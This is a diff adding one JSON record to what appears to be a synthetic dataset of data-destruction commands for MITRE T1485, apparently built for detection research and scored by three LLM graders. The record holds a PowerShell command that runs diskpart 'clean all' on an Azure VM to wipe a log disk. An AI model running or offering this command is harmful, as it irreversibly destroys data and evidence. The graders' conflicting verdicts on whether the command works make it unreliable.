@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Logs' -Name 'WinVM-Logs' -CommandId 'RunPowerShellScript' -ScriptString \"$d=@('select disk 2','clean all'); $d | diskpart\"",
+  "explanation": "Uses diskpart clean all to overwrite every sector on the targeted Windows data disk (disk 2), irreversibly destroying its contents.",
+  "rationale_steps": [
+    "Target a non-OS data disk (disk 2) that holds specific logs.",
+    "Issue diskpart clean all to write zeros across the entire disk for complete data destruction."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-5a2abfee",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper Azure PowerShell syntax, balanced quotes, correct parameter usage, and properly formatted embedded script with array declaration and piping to diskpart.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using Azure VM Run Command to execute diskpart's 'clean all' command on disk 2, which will completely and irreversibly wipe all data on the target disk.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:01:29.533182Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The `Invoke-AzVMRunCommand` cmdlet and its parameters are correctly formed, and the PowerShell script string passed to `-ScriptString` is syntactically valid for piping commands to `diskpart`.",
+        "semantic_score": 1,
+        "semantic_justification": "The `diskpart clean all` command requires administrator privileges to execute successfully, but the evaluation context explicitly states 'Privilege: None', which prevents the command from achieving its stated data destruction intent.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:01:50.980281Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The cmdlet and parameters are valid with balanced quoting, but the double-quoted ScriptString will interpolate $d before invocation, likely corrupting the intended script content.",
+        "semantic_score": 3,
+        "semantic_justification": "Using Azure Run Command to feed diskpart 'clean all' aligns with T1485, but premature $d expansion can break the script and diskpart\u2019s execution relies on proper stdin handling and elevation, so it may not perform the wipe as intended without fixes.",
+        "combined_score": 3.5,
+        "confidence": 0.72,
+        "timestamp": "2025-10-02T02:02:24.423732Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 3.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
